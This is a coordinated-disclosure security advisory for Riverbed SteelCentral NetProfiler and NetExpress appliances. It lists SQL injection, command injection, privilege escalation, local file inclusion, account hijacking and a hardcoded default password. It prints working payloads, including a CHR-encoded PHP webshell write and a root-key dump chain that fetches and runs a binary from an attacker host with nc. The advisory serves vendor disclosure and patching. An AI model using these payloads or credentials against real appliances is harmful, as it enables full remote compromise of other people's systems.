@@ -1,0 +1,258 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Riverbed SteelCentral NetProfiler & NetExpress Multiple Vulnerabilities
+Affected versions: SteelCentral NetProfiler <= 10.8.7 & SteelCentral
+NetExpress <= 10.8.7
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/Riverbed-SteelCentral-NetProfilerNetExpress-Advisory.pdf
+
++-----------+
+|Description|
++-----------+
+The Riverbed SteelCentral NetProfiler and NetExpress virtual appliances,
+which share the same code base, are affected by multiple security
+vulnerabilities, including authentication bypass, SQL injection,
+arbitrary code execution via command injection, privilege escalation,
+local file inclusion, account hijacking and hardcoded default
+credentials. Details for other low severity vulnerabilities (i.e.
+cross-site scripting) are available in the accompanying PDF.
+
++------------+
+|Exploitation|
++------------+
+==SQL Injection==
+The ‘username’ POST parameter in the login method of the common REST API
+is vulnerable to SQL injection via stacked queries. An attacker can
+exploit this vulnerability to add a user account in the application’s
+PostgreSQL database and successfully bypass authentication. The
+exploitation of this vulnerability can also be replicated from the main
+web GUI login functionality as login calls are routed to the same common
+REST API web service.
+
+The proof-of-concept request below shows how to exploit the SQL
+injection vulnerability to add a malicious user account into the ‘users’
+table of the application database. Since quote characters can't be used
+as part of the injection payload, an attacker needs to use string
+concatenation to insert the field values (i.e. 'user' =>
+CHR(117)||CHR(115)||CHR(101)||CHR(114)).
+
+[POC SQL INJECTION - INSERT USER]
+Method => POST
+URL => /api/common/1.0/login
+Content-type => application/json
+Payload => {
+  "username": "test%';INSERT INTO users (username, password, uid) VALUES
+(<user>, <SHA512 hash>, <random id>);--",
+  "password": ""
+}
+
+Additional SQL Injection vulnerabilities exist in the application’s web
+interface and can be exploited after authentication.
+
+Method        => GET
+URL         => /popup.php?page=export_report
+Parameter     => report_id
+POC Payload => 1';SELECT PG_SLEEP(5)--
+
+Method        => GET
+URL         => /popup.php?page=algorithm_settings
+Parameter     => id
+POC Payload => 1';SELECT PG_SLEEP(5)--   
+
+Method        => POST
+URL         => /index.php?page=port_config
+Parameter     => PortsSelectControl/ports_config/port_names
+POC Payload => ') AND 9625=(SELECT 9625 FROM PG_SLEEP(5)) AND
+('Pdyu'='Pdyu   
+
+Method        => POST
+URL         => /index.php?page=port_config
+Parameter     => PortsSelectControl/ports_config/port_numbers
+POC Payload => 1-100) AND 5045=(SELECT 5045 FROM PG_SLEEP(5)) AND (2272=2272
+
+Method        => POST
+URL         => /index.php?page=port_config
+Parameter     => PortsSelectControl/ports_config/port_proto
+POC Payload => ');SELECT PG_SLEEP(5)--
+
+All the SQL injections above can be trivially exploited to write
+malicious PHP code into a directory under the application web root
+folder, such as one used for file uploads, and obtain arbitrary code
+execution.
+
+[POC SQL INJECTION - WRITE WEBSHELL]   
+GET
+/popup.php?page=export_report&report_id=1';COPY+(SELECT+CHR(60)||CHR(63)||CHR(112)
+||CHR(104)||CHR(112)||CHR(32)||CHR(101)||CHR(99)||CHR(104)||CHR(111)||CHR(32)||CHR(115)
+||CHR(121)||CHR(115)||CHR(116)||CHR(101)||CHR(109)||CHR(40)||CHR(36)||CHR(95)||CHR(71)
+||CHR(69)||CHR(84)||CHR(91)||CHR(34)||CHR(99)||CHR(109)||CHR(100)||CHR(34)||CHR(93)
+||CHR(41)||CHR(59)||CHR(32)||CHR(63)||CHR(62))+TO+$$/usr/mazu/www/tmp/imports/shell.php$$;--
+&export_type=3
+
+
+==Command Injection==
+Multiple command injection vulnerabilities exist in the appliances’ web
+interfaces due to unsanitized user-supplied input passed as argument to
+shell functions. An attacker can exploit these vulnerabilities to inject
+shell commands and obtain arbitrary code execution.
+
+URL         => GET
+/popup.php?page=test_connection&device=<PAYLOAD>&type=switch
+Parameter   => device
+POC Payload => 1; touch /tmp/FILE;
+
+URL         => POST /index.php?page=licenses
+Body        => xjxfun=get_request_key&xjxr=<value>&xjxargs[]=<PAYLOAD>
+Parameter   => xjxargs[]
+POC Payload => LICENSE-TOKEN; id;
+Notes        => Token Request functionality in 'Licenses' page
+
+URL         => GET /popup.php?page=packet_export&query=<PAYLOAD>
+Parameter   => query
+POC Payload => 1; touch /tmp/MYFILE;
+
+URL         => POST /index.php?page=network_config
+Body        => <configuration params>&Setup/setup/network_hostname=<PAYLOAD>
+Parameter   => Setup/setup/network_hostname
+POC Payload => 1; touch /tmp/MYFILE;
+Notes        => 'Configure now' functionality, injection occurs after
+appliance reboots.
+
+URL         => POST /index.php?page=product_info
+Body        => xjxfun=delete_collect&&xjxr=<value>&xjxargs[]=<PAYLOAD>
+Parameter   => xjxargs[]
+POC Payload => 1; touch /tmp/MYFILE;
+Notes        => 'Delete collected entry' functionality
+
+==Privilege Escalation==
+An insecure configuration of the /etc/sudoers file allows privilege
+escalation to root. The ‘apache’ user is allowed to run multiple scripts
+under the /usr/mazu/bin directory without being prompted for a password,
+including the following sudoers entry:
+
+/usr/mazu/bin/mazu-run /usr/bin/sudo /bin/date*
+
+The ‘mazu-run’ script can be used to invoke the /bin/date binary in the
+context of the built-in ‘mazu’ user. An attacker can abuse the mazu-run
+script to run the /bin/date binary with the –f flag against a sensitive
+file such as the root private SSH key. The ‘–f’ option instructs the
+‘date’ binary to parse the file specified as a DATEFILE. By default, the
+command ‘date’ will echo back an error message with the contents of the
+specified file when this does not comply with a valid DATEFILE format.
+This technique can be exploited to get the root SSH private RSA key and
+write it into the appliance filesystem using output redirection. An
+attacker can then establish a SSH connection to the target system by
+using the dumped private key to authenticate as root and spawn a root
+reverse shell. The POC payload below shows how to exploit the vulnerability.
+
+[POC PRIVILEGE ESCALATION]
+sudo -u mazu /usr/mazu/bin/mazu-run /usr/bin/sudo /bin/date -f
+/opt/cascade/vault/ssh/root/id_rsa | cut -d ' ' -f 4-
+| tr -d '`' | tr -d "'" > /tmp/root_ssh_privatekey; chmod 600
+/tmp/root_ssh_privatekey; ssh -o UserKnownHostsFile=/dev/null
+ -o StrictHostKeyChecking=no -i /tmp/root_ssh_privatekey root@localhost
+'nc -n [attacker ip] 4444 > /tmp/shell.elf;
+chmod 755 /tmp/shell.elf; /tmp/shell.elf';
+
+==Local File Inclusion==
+A local file inclusion vulnerability exists in the
+‘sensor/ta_loader.php’ file due to a lack of input sanization for the
+GET parameter ‘class’. This allows an attacker to read or include
+arbitrary files.
+
+As a practical exploitation scenario, an attacker can obtain arbitrary
+code execution through the LFI vulnerability by first using the ‘Edit
+/etc/hosts’ functionality available under
+‘/index.php?page=network_config’ to create a fake host entry (e.g.
+'192.1.2.3 <?php echo system($_GET["cmd"]); ?>' ) and write malicious
+PHP code on the appliance filesystem, then include the /etc/hosts file
+and execute arbitrary shell commands.
+
+[POC LFI]
+curl https://<host>/sensor/ta_loader.php?cmd=<COMMAND>&class=/etc/hosts
+
+==Account Hijacking==
+The password change functionality under the
+‘/index.php?page=security_compliance’ page is vulnerable to a logic bug
+which allows account hijacking via arbitrary password reset. Although
+the functionality prompts for the current account password before
+allowing the user to set a new password, the hashed credentials of all
+the system accounts on the SteelCentral NetProfiler and NetExpress
+appliances are disclosed within the ‘accountscredentialsid’ hidden
+parameter in the page source code. The contents of the parameter are the
+base64-encoded representation of a serialized PHP object containing the
+credentials data.
+
+This not only openly discloses the contents of the /etc/shadow file, but
+can be also abused to carry out arbitrary password resets since the
+current password verification is carried out on client-side against the
+‘oldpassword’ field value within the serialized string. An attacker can
+first generate a valid SHA-512 hash for an arbitrary current password
+value along with computing the hash length.  Then the password change
+HTTP request can be intercepted to decode the base64-encoded serialized
+object and modify the ‘oldpassword’ hash value and its length for the
+target system account to hijack with the generated SHA-512 hash of the
+chosen current password value. The malicious string can now be base64
+encoded back and used to replace the original request string.
+
+After clicking the ‘Configure Now’ button the application will validate
+the current password value provided through the web interface against
+the injected hash value, successfully setting the new password to the
+arbitrary value chosen by the attacker.
+
+==Hardcoded default credentials==
+Multiple system accounts are configured on every deployment of the
+SteelCentral NetProfiler and NetExpress virtual appliances with the same
+hardcoded default credentials publicly available on the web.
+
+Users        =>    mazu, dhcp, root
+Password =>    bb!nmp4y
+
+The default ‘mazu’ user sudo configuration allows the execution of all
+shell commands as root without being prompted for a password. The user
+'mazu' is the only privileged user account having remote SSH access to
+the SteelCentral NetProfiler and NetExpress appliances (root SSH access
+is restricted to localhost only). However, the application does not
+enforce a password change for the built-in 'mazu' user during
+configuration time or after the first login. These insecure settings can
+be exploited as a remote backdoor to gain a privileged SSH shell to the
+target system.
+
++----------+
+| Solution |
++----------+
+Upgrade Riverbed SteelCentral Netprofiler/NetExpress to version 10.9.0.
+
+At the time of this writing, although the account hijacking
+vulnerability has been resolved, the contents of the /etc/shadow file
+are still disclosed in the hidden parameter ‘originalsettingsid’ when
+browsing to ‘/index.php?page=security_compliance’.
+
++------------+
+|  Timeline  |
++------------+
+24/03/2016 – Initial disclosure to Riverbed.
+25/03/2016 – Vendor confirms receipt of advisory.
+18/04/2016 – Sent follow up email asking for a status update
+19/04/2016 – Vendor replies engineering team is working on software patches.
+13/06/2016 – Vendor releases patched software build.
+27/06/2016 – Public Disclosure
+
++------------+
+| Additional |
++------------+
+http://www.security-assessment.com/files/documents/advisory/Riverbed-SteelCentral-NetProfilerNetExpress-Advisory.pdf
